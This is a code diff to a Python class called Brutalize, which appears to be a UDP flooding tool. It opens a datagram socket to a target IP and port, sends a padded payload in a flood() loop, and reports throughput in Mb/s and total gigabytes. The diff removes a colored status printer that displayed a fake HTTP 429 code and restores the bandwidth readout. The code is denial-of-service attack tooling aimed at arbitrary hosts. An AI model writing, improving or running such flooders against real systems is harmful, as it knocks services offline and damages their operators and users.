@@ -6,10 +6,6 @@ from time import time, sleep
 
 from getpass import getpass as hinput
 
-import sys
-from termcolor import colored
-
-
 class Brutalize:
 
     def __init__(self, ip, port, force, threads):
@@ -21,12 +17,6 @@ class Brutalize:
         self.client = socket(family=AF_INET, type=SOCK_DGRAM)
         self.data = str.encode("x" * self.force)
         self.len = len(self.data)
-
-    def print_status(self, status_code, requested_data_size):
-      print(colored("Status: [", "red") + colored(str(status_code), "red") + colored("]", "red") + colored(" --> requested data size: ", "white") + colored(requested_data_size, "blue"), file=sys.stderr)
-
-
-
 
     def flood(self):
         self.on = True
@@ -53,9 +43,7 @@ class Brutalize:
 
             if size != 0:
                 self.total += self.sent *bytediff / gb* interval
-                self.print_status(429, "107.84KB")
-                
-
+                print(f"{round(size)} Mb/s - Total: {round(self.total, 1)} Gb.                    ", end='\r')
 
             now2 = time()
 
